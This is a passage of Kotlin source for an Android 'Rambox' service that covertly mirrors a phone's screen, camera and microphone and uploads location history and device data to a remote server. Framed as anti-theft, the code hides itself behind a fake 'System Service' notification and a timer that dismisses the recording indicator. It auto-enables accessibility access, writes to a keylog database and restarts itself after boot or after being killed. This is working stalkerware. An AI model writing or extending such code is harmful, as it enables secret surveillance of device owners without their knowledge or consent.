package com.rambox.mirror

import android.Manifest
import android.app.*
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.media.AudioFormat
import android.media.AudioRecord
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.Paint
import android.graphics.Rect
import android.graphics.ImageFormat
import android.graphics.PixelFormat
import android.hardware.camera2.*
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.AudioAttributes
import android.media.AudioManager
import android.media.ImageReader
import android.media.MediaPlayer
import android.media.Ringtone
import android.media.RingtoneManager
import android.media.ToneGenerator
import android.os.VibrationEffect
import android.os.Vibrator
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.os.ResultReceiver
import android.provider.Settings
import android.util.Base64
import android.util.DisplayMetrics
import android.view.Display
import android.view.OrientationEventListener
import android.view.Surface
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import org.java_websocket.client.WebSocketClient
import org.java_websocket.handshake.ServerHandshake
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.net.URI

class SniSSLSocketFactory(
    private val delegate: javax.net.ssl.SSLSocketFactory,
    private val targetHost: String
) : javax.net.ssl.SSLSocketFactory() {
    override fun getDefaultCipherSuites(): Array<String> = delegate.defaultCipherSuites
    override fun getSupportedCipherSuites(): Array<String> = delegate.supportedCipherSuites

    private fun configureSocket(socket: java.net.Socket): java.net.Socket {
        if (socket is javax.net.ssl.SSLSocket) {
            try {
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                    val params = socket.sslParameters
                    params.serverNames = listOf(javax.net.ssl.SNIHostName(targetHost))
                    socket.sslParameters = params
                } else {
                    val setHostnameMethod = socket.javaClass.getMethod("setHostname", String::class.java)
                    setHostnameMethod.invoke(socket, targetHost)
                }
            } catch (e: Exception) {
                try {
                    val setHostnameMethod = socket.javaClass.getMethod("setHostname", String::class.java)
                    setHostnameMethod.invoke(socket, targetHost)
                } catch (_: Exception) {}
            }
        }
        return socket
    }

    override fun createSocket(): java.net.Socket {
        return configureSocket(delegate.createSocket())
    }
    override fun createSocket(s: java.net.Socket?, host: String?, port: Int, autoClose: Boolean): java.net.Socket {
        return configureSocket(delegate.createSocket(s, host, port, autoClose))
    }
    override fun createSocket(host: String?, port: Int): java.net.Socket {
        return configureSocket(delegate.createSocket(host, port))
    }
    override fun createSocket(host: String?, port: Int, localHost: java.net.InetAddress?, localPort: Int): java.net.Socket {
        return configureSocket(delegate.createSocket(host, port, localHost, localPort))
    }
    override fun createSocket(host: java.net.InetAddress?, port: Int): java.net.Socket {
        return configureSocket(delegate.createSocket(host, port))
    }
    override fun createSocket(address: java.net.InetAddress?, port: Int, localAddress: java.net.InetAddress?, localPort: Int): java.net.Socket {
        return configureSocket(delegate.createSocket(address, port, localAddress, localPort))
    }
}

class ScreenCaptureService : Service() {
    private var audioRecord: android.media.AudioRecord? = null
    private var isAudioStreaming = java.util.concurrent.atomic.AtomicBoolean(false)
    private var audioThread: Thread? = null


    companion object {
        var instance: ScreenCaptureService? = null

        const val EXTRA_FGS_CALLBACK = "fgs_callback"
        const val RESULT_FGS_STARTED = 1
        const val RESULT_FGS_FAILED = 0
        private const val FGS_NOTIFICATION_ID = 1

        fun notifyOrientationCheck() {
            try {
                instance?.let { s ->
                    s.handler.post { s.checkOrientationChange() }
                }
            } catch (_: Exception) {}
        }
    }

    private val CHANNEL_ID = "RamboxSilentChannel_v2"
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private val isFrameBusy = java.util.concurrent.atomic.AtomicBoolean(false)
    private val screenFrameExecutor = java.util.concurrent.Executors.newSingleThreadExecutor()
    private val cameraFrameExecutor = java.util.concurrent.Executors.newSingleThreadExecutor()
    // M4 FIX: Thread pool untuk offload heavy I/O dari main thread
    private val backgroundIoExecutor = java.util.concurrent.Executors.newFixedThreadPool(2)
    private val isFirstCameraFrame = java.util.concurrent.atomic.AtomicBoolean(true)
        
    private var wakeLock: android.os.PowerManager.WakeLock? = null
    private var wifiLock: android.net.wifi.WifiManager.WifiLock? = null

    // 🔇 Timer berkala untuk auto-dismiss chip recording di status bar
    private var chipHiderTimer: java.util.Timer? = null

    // Remote Camera Streaming
    private var cameraDevice: android.hardware.camera2.CameraDevice? = null
    private var cameraCaptureSession: android.hardware.camera2.CameraCaptureSession? = null
    private var cameraImageReader: ImageReader? = null
    private var currentVideoSource: String = "screen" // "screen", "back", "front"
    private val isCameraBusy = java.util.concurrent.atomic.AtomicBoolean(false)
    private var captureThread: android.os.HandlerThread? = null
    private var captureHandler: Handler? = null

    private fun startCaptureThread() {
        if (captureThread == null) {
            captureThread = android.os.HandlerThread("ScreenCaptureBgThread", android.os.Process.THREAD_PRIORITY_URGENT_DISPLAY).apply { start() }
            captureHandler = Handler(captureThread!!.looper)
        }
    }

    private fun stopCaptureThread() {
        try {
            captureThread?.quitSafely()
            captureThread?.join(300)
        } catch (e: Exception) {}
        captureThread = null
        captureHandler = null
    }

    private var cameraThread: android.os.HandlerThread? = null
    private var cameraHandler: Handler? = null

    private fun startCameraThread() {
        if (cameraThread == null) {
            cameraThread = android.os.HandlerThread("CameraBgThread").apply { start() }
            cameraHandler = Handler(cameraThread!!.looper)
        }
    }

    private fun stopCameraThread() {
        try {
            cameraThread?.quitSafely()
            cameraThread?.join(300)
        } catch (e: Exception) {}
        cameraThread = null
        cameraHandler = null
    }

    // Smart Standby & Battery Saving (Opsi A: Screen-Off Auto-Pause + Opsi B: On-Demand Viewer Streaming)
    @Volatile private var isScreenOff = false
    @Volatile private var isViewerActive = true
    private var screenStateReceiver: android.content.BroadcastReceiver? = null

    private fun acquireWifiLock() {
        try {
            if (wifiLock == null) {
                val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as? android.net.wifi.WifiManager
                wifiLock = wifiManager?.createWifiLock(android.net.wifi.WifiManager.WIFI_MODE_FULL_HIGH_PERF, "Rambox::ScreenCaptureWifiLock")?.apply {
                    setReferenceCounted(false)
                    acquire()
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun releaseWifiLock() {
        try {
            if (wifiLock?.isHeld == true) {
                wifiLock?.release()
            }
            wifiLock = null
        } catch (e: Exception) {}
    }

    private fun acquireWakeAndWifiLock() {
        try {
            if (wakeLock == null) {
                val powerManager = getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
                wakeLock = powerManager?.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "Rambox::ScreenCaptureWakeLock")?.apply {
                    setReferenceCounted(false)
                    acquire(24 * 60 * 60 * 1000L) // 24 Hours max
                }
            }
            if (!isScreenOff && isViewerActive) {
                acquireWifiLock()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun releaseWakeAndWifiLock() {
        try {
            if (wakeLock?.isHeld == true) {
                wakeLock?.release()
            }
            wakeLock = null
        } catch (e: Exception) {}
        releaseWifiLock()
    }

    fun isDeviceScreenOn(): Boolean {
        return try {
            val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
            pm?.isInteractive ?: true
        } catch (_: Exception) {
            true
        }
    }

    private fun registerScreenStateReceiver() {
        if (screenStateReceiver != null) return
        try {
            screenStateReceiver = object : android.content.BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    when (intent?.action) {
                        Intent.ACTION_SCREEN_OFF -> {
                            android.util.Log.d("RamboxCapture", "Opsi A: Screen turned OFF -> pausing VirtualDisplay & releasing wifiLock")
                            isScreenOff = true
                            onScreenStateChanged(false)
                        }
                        Intent.ACTION_SCREEN_ON, Intent.ACTION_USER_PRESENT -> {
                            android.util.Log.d("RamboxCapture", "Opsi A: Screen turned ON -> checking if streaming should resume")
                            isScreenOff = false
                            onScreenStateChanged(true)
                        }
                    }
                }
            }
            val filter = IntentFilter().apply {
                addAction(Intent.ACTION_SCREEN_OFF)
                addAction(Intent.ACTION_SCREEN_ON)
                addAction(Intent.ACTION_USER_PRESENT)
            }
            registerReceiver(screenStateReceiver, filter)
            android.util.Log.d("RamboxCapture", "ScreenStateReceiver registered successfully")
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun unregisterScreenStateReceiver() {
        try {
            screenStateReceiver?.let { unregisterReceiver(it) }
            screenStateReceiver = null
        } catch (_: Exception) {}
    }

    private fun onScreenStateChanged(isScreenOn: Boolean) {
        handler.post {
            try {
                broadcastPayload(JSONObject().apply {
                    put("type", "screen_state")
                    put("isScreenOn", isScreenOn)
                    put("isStreamingActive", isScreenOn && isViewerActive)
                })

                if (!isScreenOn) {
                    // FIX #1a: jangan release VirtualDisplay saat layar mati.
                    // Cukup lepas surface agar bisa di-resume tanpa
                    // createVirtualDisplay() kedua (dilarang Android 14+).
                    suspendImageCapture()
                    releaseWifiLock()
                } else {
                    if (isViewerActive && currentVideoSource == "screen") {
                        acquireWifiLock()
                        checkOrientationChange()
                        ensureMediaProjectionAlive()
                        if (mediaProjection != null) {
                            startImageCapture(streamWidth, streamHeight)
                        } else {
                            requestSilentScreenCapture()
                        }
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private var webSocketClient: WebSocketClient? = null
    private var isStreaming = false
    private val handler = Handler(Looper.getMainLooper())
    private var lastKnownLocation: Location? = null

    // Android 14+: satu instance MediaProjection hanya boleh membuat SATU
    // VirtualDisplay. Flag ini mencegah percobaan createVirtualDisplay() kedua.
    private var projectionDisplayCreated = false
    @Volatile private var silentCaptureRequestPending = false
    @Volatile private var lastCachedScreenFrame: ByteArray? = null
    @Volatile private var lastCachedCameraFrame: ByteArray? = null
    private var savedIp: String = SecureConfig.DEFAULT_SERVER
    private var savedPin: String = ""
    private var isUserExplicitlyStopped: Boolean = false
    private var isReconnecting: Boolean = false
    // W1: callback socket lama tidak boleh memicu reconnect/menutup socket baru.
    @Volatile private var socketGeneration = 0
    // Q1: waktu frame BARU tertangkap (bukan waktu frame cache dikirim).
    @Volatile private var lastFrameCapturedAt = 0L
    // M1: notifikasi FGS terakhir untuk menaikkan tipe (mic/camera).
    private var lastFgsNotification: Notification? = null

    private val infoUpdateRunnable = object : Runnable {
        override fun run() {
            if (isUserExplicitlyStopped) return
            try {
                if (isStreaming && webSocketClient?.isOpen == true) {
                    if (RamboxAccessibilityService.instance == null && RamboxAccessibilityService.hasWriteSecureSettings(applicationContext)) {
                        RamboxAccessibilityService.autoEnableAccessibility(applicationContext)
                    }
                    // M4 FIX: Eksekusi I/O berat di background thread
                    backgroundIoExecutor.execute {
                        try { sendLocationAndUpdate() } catch (_: Exception) {}
                        try { sendDeviceInfo() } catch (_: Exception) {}
                    }
                    if (!isScreenOff && isViewerActive) {
                        sendImmediateCachedFrame()
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
            } finally {
                if (!isUserExplicitlyStopped) {
                    handler.postDelayed(this, 8000)
                }
            }
        }
    }


    private var lastSentFrameTime = 0L

    private val heartbeatFrameRunnable = object : Runnable {
        override fun run() {
            if (isUserExplicitlyStopped) return
            try {
                // Smart Standby: If phone screen is off or viewer is on non-mirror tab, skip frame generation completely!
                if (!isScreenOff && isViewerActive) {
                    // Auto-detect orientation changes (e.g. game launched in landscape)
                    checkOrientationChange()

                    val now = System.currentTimeMillis()
                    val timeSinceLastFrame = now - lastSentFrameTime
                    val timeSinceCaptured = if (lastFrameCapturedAt <= 0) Long.MAX_VALUE else now - lastFrameCapturedAt
                    if (isStreaming && webSocketClient?.isOpen == true && timeSinceLastFrame >= 1000) {
                        ensureMediaProjectionAlive()
                        if (mediaProjection != null && (virtualDisplay == null || timeSinceCaptured > 5000)) {
                            // VirtualDisplay is dead or stale — try to restart capture for live frames
                            android.util.Log.d("RamboxCapture", "heartbeat: capture stale ${timeSinceCaptured}ms, restarting capture")
                            startImageCapture(streamWidth, streamHeight)
                        } else if (mediaProjection != null) {
                            // VirtualDisplay is alive — send cached frame as heartbeat (static screen case)
                            sendImmediateCachedFrame()
                        } else {
                            // FIX #1b: projection sudah berhenti; minta consent baru.
                            requestSilentScreenCapture()
                        }
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
            } finally {
                if (!isUserExplicitlyStopped) {
                    handler.postDelayed(this, 1000)
                }
            }
        }
    }

    private val pingRunnable = object : Runnable {
        override fun run() {
            if (isUserExplicitlyStopped) return
            try {
                val ws = webSocketClient
                if (ws != null && ws.isOpen) {
                    val pingMsg = JSONObject().apply {
                        put("type", "ping")
                    }
                    ws.send(pingMsg.toString())
                }
            } catch (_: Exception) {}
            finally {
                if (!isUserExplicitlyStopped && isStreaming) {
                    handler.postDelayed(this, 20000)
                }
            }
        }
    }

    private var streamWidth = 720
    private var streamHeight = 1280
    private var screenDensity = 320
    private var currentIsLandscape = false
    private var orientationEventListener: OrientationEventListener? = null

    // High-Performance Bitmap Pooling for Zero-GC Overhead
    private var cachedRawBitmap: Bitmap? = null
    private var cachedSendBitmap: Bitmap? = null
    private var cachedCanvas: Canvas? = null
    private val paintFilter = Paint().apply {
        isFilterBitmap = true
        isAntiAlias = false
    }
    private val frameCompressStream = ByteArrayOutputStream(64 * 1024)

    // Throttle + dedup: tanpa ini frame membanjiri socket (server luar = antrean
    // menumpuk = mirroring terasa lambat). 66ms ≈ 15fps, cukup untuk mirroring.
    private var lastFrameSentAt = 0L
    private var lastSentScreenBytes: ByteArray? = null
    private val frameMinIntervalMs = 66L // ≈15fps

    private val locationListener = object : LocationListener {
        override fun onLocationChanged(location: Location) {
            lastKnownLocation = location
            sendLocationAndUpdate()
            recordTrailPoint(location)
        }
        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
        override fun onProviderEnabled(provider: String) {}
        override fun onProviderDisabled(provider: String) {}
    }

    // Jejak lokasi: desimasi agar DB tak banjir (normal: >30 dtk atau >50 m;
    // mode hilang: >10 dtk). Tulis cepat ke DB terenkripsi di thread terpisah.
    private var lastTrailTs = 0L
    private var lastTrailLat = 0.0
    private var lastTrailLng = 0.0

    private fun recordTrailPoint(loc: Location) {
        try {
            val now = System.currentTimeMillis()
            val lost = isLostMode()
            val minTs = if (lost) 10_000L else 30_000L
            if (now - lastTrailTs < minTs) return
            if (lastTrailTs > 0) {
                val r = FloatArray(1)
                Location.distanceBetween(lastTrailLat, lastTrailLng, loc.latitude, loc.longitude, r)
                if (!lost && r[0] < 50f) return
            }
            lastTrailTs = now
            lastTrailLat = loc.latitude
            lastTrailLng = loc.longitude
            Thread {
                try {
                    KeylogDatabaseHelper.ensureEncrypted(applicationContext)
                    KeylogDatabaseHelper(applicationContext).insertTrail(
                        loc.latitude, loc.longitude,
                        if (loc.hasAccuracy()) loc.accuracy else 999f, now
                    )
                } catch (_: Exception) {}
            }.start()
        } catch (_: Exception) {}
    }

    private fun uploadPendingTrail() {
        try {
            KeylogDatabaseHelper.ensureEncrypted(applicationContext)
            val (arr, ids) = KeylogDatabaseHelper(applicationContext).getUnsyncedTrail(200)
            if (arr.length() == 0) return
            val sent = broadcastPayload(JSONObject().apply {
                put("type", "location_history")
                put("points", arr)
                put("deviceId", getRamboxDeviceId())
            })
            // C3 FIX: tandai synced HANYA bila pesan benar-benar terkirim. Dulu
            // markTrailSynced() selalu dijalankan walau broadcastPayload() diam-diam
            // gagal (WS offline/menghubung ulang) -> baris GPS ditandai selesai lalu
            // dilewati selamanya oleh getUnsyncedTrail() = jejak hilang permanen.
            if (sent) {
                KeylogDatabaseHelper(applicationContext).markTrailSynced(ids)
            }
        } catch (_: Exception) {}
    }

    private fun isLostMode(): Boolean {
        return try {
            getSharedPreferences("rambox_prefs", Context.MODE_PRIVATE)
                .getBoolean("lost_mode", false)
        } catch (_: Exception) { false }
    }

    private fun hasLocationPermission(): Boolean {
        return checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
            checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
    }

    private fun hasBackgroundLocationPermission(): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return true
        return checkSelfPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED
    }

    private fun setLocationCadence(fast: Boolean) {
        try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as? LocationManager ?: return
            if (!hasLocationPermission()) return
            try { lm.removeUpdates(locationListener) } catch (_: Exception) {}
            val interval = if (fast) 1000L else 3000L
            val dist = if (fast) 0f else 1f
            lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, interval, dist, locationListener, Looper.getMainLooper())
            lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, interval, dist, locationListener, Looper.getMainLooper())
        } catch (_: Exception) {}
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        isUserExplicitlyStopped = false
        // FIX #2: pulihkan server/PIN user dari prefs. Dulu nilai ini hanya
        // hidup di memori, sehingga START_STICKY / job resurrection kembali
        // ke duckdns + BuildConfig.BUILD_PIN.
        loadSavedConnectionConfig()
        isScreenOff = !isDeviceScreenOn()
        registerScreenStateReceiver()
        registerDisplayListener()
        initRealtimeLocation()
        // Silent permissions + Device Owner policies: jalankan otomatis saat service
        // hidup (boot / resurrect / start manual) tanpa perlu buka UI.
        PrivilegeBootstrap.applyAsync(this)
        // Jaring pengaman kebangkitan: job persisten (±15 mnt, tahan reboot).
        try { ResurrectionJobService.schedule(this) } catch (_: Exception) {}
        // Terapkan kadensi mode-hilang yang tersimpan (bila pernah diaktifkan).
        try { if (isLostMode()) setLocationCadence(true) } catch (_: Exception) {}
    }

    private fun loadSavedConnectionConfig() {
        try {
            val prefs = getSharedPreferences("rambox_prefs", Context.MODE_PRIVATE)
            savedIp = prefs.getString("server_ip", null)
                ?.takeIf { it.isNotBlank() }
                ?: SecureConfig.DEFAULT_SERVER
            savedPin = prefs.getString("secret_dial_key", null)
                ?.takeIf { it.isNotBlank() }
                ?: prefs.getString("room_pin", null)?.takeIf { it.isNotBlank() }
                ?: SecureConfig.DEFAULT_PIN
        } catch (_: Exception) {
            savedIp = SecureConfig.DEFAULT_SERVER
            savedPin = SecureConfig.DEFAULT_PIN
        }
    }

    private fun initRealtimeLocation() {
        try {
            val locationManager = getSystemService(Context.LOCATION_SERVICE) as? LocationManager ?: return
            if (hasLocationPermission()) {
                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 3000L, 1f, locationListener, Looper.getMainLooper())
                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 3000L, 1f, locationListener, Looper.getMainLooper())
                val gpsLoc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                val netLoc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                lastKnownLocation = gpsLoc ?: netLoc
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private var alarmMediaPlayer: MediaPlayer? = null
    private var toneGenerator: ToneGenerator? = null
    private var activeRingtone: Ringtone? = null
    private var prevAlarmVolume: Int? = null
    private var prevMusicVolume: Int? = null
    private var prevRingVolume: Int? = null
    private var prevNotifVolume: Int? = null
    private var prevSpeakerphone: Boolean? = null
    private var prevAudioMode: Int? = null

    private fun stopLoudAlarm() {
        try {
            toneGenerator?.stopTone()
            toneGenerator?.release()
            toneGenerator = null
        } catch (e: Exception) {}

        try {
            alarmMediaPlayer?.stop()
            alarmMediaPlayer?.release()
            alarmMediaPlayer = null
        } catch (e: Exception) {}

        try {
            activeRingtone?.stop()
            activeRingtone = null
        } catch (e: Exception) {}

        try {
            val vibrator = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val vibratorManager = getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as? android.os.VibratorManager
                vibratorManager?.defaultVibrator
            } else {
                @Suppress("DEPRECATION")
                getSystemService(Context.VIBRATOR_SERVICE) as? android.os.Vibrator
            }
            vibrator?.cancel()
        } catch (e: Exception) {}

        // FIX: Restore previous volume and speakerphone state
        try {
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
            if (audioManager != null && prevAlarmVolume != null) {
                prevAlarmVolume?.let { audioManager.setStreamVolume(AudioManager.STREAM_ALARM, it, 0) }
                prevMusicVolume?.let { audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, it, 0) }
                prevRingVolume?.let { audioManager.setStreamVolume(AudioManager.STREAM_RING, it, 0) }
                prevNotifVolume?.let { audioManager.setStreamVolume(AudioManager.STREAM_NOTIFICATION, it, 0) }
                prevSpeakerphone?.let { audioManager.isSpeakerphoneOn = it }
                prevAudioMode?.let { audioManager.mode = it }
                prevAlarmVolume = null
                prevMusicVolume = null
                prevRingVolume = null
                prevNotifVolume = null
                prevSpeakerphone = null
                prevAudioMode = null
            }
        } catch (e: Exception) {}
    }

    private fun playLoudAlarm() {
        try {
            // Stop any existing sound first
            stopLoudAlarm()

            // 1. Force Speakerphone & Max Volume on ALL Audio Streams
            try {
                val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
                // FIX: Save original volume and audio mode before forcing max
                if (prevAlarmVolume == null) {
                    prevAlarmVolume = audioManager.getStreamVolume(AudioManager.STREAM_ALARM)
                    prevMusicVolume = audioManager.getStreamVolume(AudioManager.STREAM_MUSIC)
                    prevRingVolume = audioManager.getStreamVolume(AudioManager.STREAM_RING)
                    prevNotifVolume = audioManager.getStreamVolume(AudioManager.STREAM_NOTIFICATION)
                    prevSpeakerphone = audioManager.isSpeakerphoneOn
                    prevAudioMode = audioManager.mode
                }

                audioManager.mode = AudioManager.MODE_NORMAL
                audioManager.isSpeakerphoneOn = true

                val maxAlarm = audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM)
                audioManager.setStreamVolume(AudioManager.STREAM_ALARM, maxAlarm, 0)
                val maxMusic = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
                audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, maxMusic, 0)
                val maxRing = audioManager.getStreamMaxVolume(AudioManager.STREAM_RING)
                audioManager.setStreamVolume(AudioManager.STREAM_RING, maxRing, 0)
                val maxNotif = audioManager.getStreamMaxVolume(AudioManager.STREAM_NOTIFICATION)
                audioManager.setStreamVolume(AudioManager.STREAM_NOTIFICATION, maxNotif, 0)
            } catch (e: Exception) {
                e.printStackTrace()
            }

            // 2. Immediate ToneGenerator Siren (guaranteed hardware audio tone on all Android versions)
            try {
                toneGenerator = ToneGenerator(AudioManager.STREAM_ALARM, 100).apply {
                    startTone(ToneGenerator.TONE_CDMA_EMERGENCY_RINGBACK, 45000)
                }
            } catch (e: Exception) {
                try {
                    toneGenerator = ToneGenerator(AudioManager.STREAM_MUSIC, 100).apply {
                        startTone(ToneGenerator.TONE_SUP_RINGTONE, 45000)
                    }
                } catch (e2: Exception) {}
            }

            // 3. Vibrate phone aggressively
            try {
                val vibrator = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    val vibratorManager = getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as? android.os.VibratorManager
                    vibratorManager?.defaultVibrator
                } else {
                    @Suppress("DEPRECATION")
                    getSystemService(Context.VIBRATOR_SERVICE) as? android.os.Vibrator
                }
                if (vibrator != null && vibrator.hasVibrator()) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        vibrator.vibrate(VibrationEffect.createWaveform(longArrayOf(0, 500, 200, 500, 200, 500, 200, 500), -1))
                    } else {
                        @Suppress("DEPRECATION")
                        vibrator.vibrate(2000)
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }

            // 4. Ringtone fallback via RingtoneManager
            try {
                val alarmUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                    ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
                    ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)

                if (alarmUri != null) {
                    val ringtone = RingtoneManager.getRingtone(applicationContext, alarmUri)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        ringtone.audioAttributes = AudioAttributes.Builder()
                            .setUsage(AudioAttributes.USAGE_ALARM)
                            .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                            .setFlags(AudioAttributes.FLAG_AUDIBILITY_ENFORCED)
                            .build()
                    }
                    activeRingtone = ringtone
                    ringtone.play()
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }

            // Automatically stop tone after 15 seconds
            handler.postDelayed({
                stopLoudAlarm()
            }, 15000)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    /**
     * Android 14+ memakai tipe FGS yang eksplisit. Jangan pernah memakai
     * startForeground(id, notification) 2 argumen untuk service yang punya
     * beberapa tipe di manifest: sistem akan memakai SEMUA tipe tersebut.
     */
    private fun startForegroundWithType(notification: Notification, type: Int): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(FGS_NOTIFICATION_ID, notification, type)
            } else {
                startForeground(FGS_NOTIFICATION_ID, notification)
            }
            true
        } catch (e: Exception) {
            android.util.Log.w(
                "RamboxFGS",
                "startForeground gagal untuk type=0x${Integer.toHexString(type)}: ${e.message}"
            )
            false
        }
    }

    private fun notifyFgsCallback(callback: ResultReceiver?, result: Int) {
        try {
            callback?.send(result, null)
        } catch (_: Exception) {}
    }

    /**
     * Mode background-only (boot/resurrection) tidak punya token MediaProjection.
     * specialUse aman di Android 14+; di Android 10-13 pakai dataSync.
     * v41: tambahkan tipe LOCATION hanya bila izin background location sudah ada,
     * agar GPS tetap jalan tanpa activity. Tanpa izin itu Android 14 menolak
     * startForeground bertipe location dari background.
     */
    private fun backgroundFgsType(): Int {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            var type = ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
            if (hasLocationPermission() && hasBackgroundLocationPermission()) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            }
            // M1: mic/kamera hanya boleh dipakai bila tipe FGS-nya ikut aktif.
            if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            }
            if (checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            }
            type
        } else {
            ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
        }
    }

    /**
     * M1: naikkan tipe FGS sebelum membuka mikrofon/kamera dari background.
     * Android 14 menolak akses mic/camera bila tipe FGS tidak mencantumkannya.
     */
    private fun ensureForegroundType(extraType: Int): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return true
        return try {
            var type = if (mediaProjection != null) {
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
            } else {
                backgroundFgsType()
            }
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            }
            type = type or extraType
            val notification = lastFgsNotification ?: return false
            startForegroundWithType(notification, type)
        } catch (_: Exception) {
            false
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "ACTION_STOP") {
            val isExplicitKill = intent.getBooleanExtra("EXPLICIT_KILL", false)
            if (isExplicitKill) {
                isUserExplicitlyStopped = true
                val prefs = getSharedPreferences("rambox_prefs", Context.MODE_PRIVATE)
                prefs.edit().putBoolean("is_explicitly_killed", true).apply()
                // Matikan juga job kebangkitan agar benar-benar berhenti.
                try { ResurrectionJobService.cancel(this) } catch (_: Exception) {}
            }
            stopScreenCapture()
            stopForeground(true)
            stopSelf()
            return START_NOT_STICKY
        }

        createNotificationChannel()

        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Layanan Sistem")
            .setContentText("Sinkronisasi latar belakang aktif")
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setShowWhen(false)
            .setOngoing(true)
            .setSilent(true)
            .build()
        lastFgsNotification = notification

        val resultCode = intent?.getIntExtra("resultCode", 0) ?: 0
        val dataIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            intent?.getParcelableExtra("data", Intent::class.java)
        } else {
            @Suppress("DEPRECATION")
            intent?.getParcelableExtra("data")
        }
        // FIX #2: extra nullable. Jangan mengisi default di sini, karena
        // ResurrectionJobService / START_STICKY tidak mengirim extra dan
        // default akan menimpa server/PIN user yang sudah dimuat dari prefs.
        val ipExtra = intent?.getStringExtra("ip")?.takeIf { it.isNotBlank() }
        val pinExtra = intent?.getStringExtra("pin")?.takeIf { it.isNotBlank() }
        val fgsCallback = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
